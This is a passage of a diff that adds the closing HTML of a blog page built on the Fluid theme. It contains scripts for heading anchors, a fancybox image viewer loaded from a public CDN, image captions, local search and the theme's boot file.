+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
